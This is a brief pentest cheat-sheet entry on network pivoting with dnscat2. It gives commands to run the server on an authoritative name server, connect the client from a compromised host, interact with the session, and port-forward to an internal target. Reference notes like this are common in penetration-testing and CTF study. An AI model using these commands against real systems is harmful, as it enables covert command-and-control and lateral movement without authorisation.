---
tags:
    - pivoting
    - linux
---
We can use dnscat2. Server runs on an authoritative name server for a specific domain and clients run on compromised hosts.


1. Run the server on the name server:
```bash
dnscat2-server "$DOMAIN"
```

2. Run the client on the compromised host:
```bash
./dnscat "$DOMAIN"
```

3. Once connection is made, list the active windows with `windows`, and enter the window with `window -i $ID`.

4. To port forward, run:
```
listen 127.0.0.1:$PIVOT_PORT $TARGET_IP:$TARGET_PORT
```
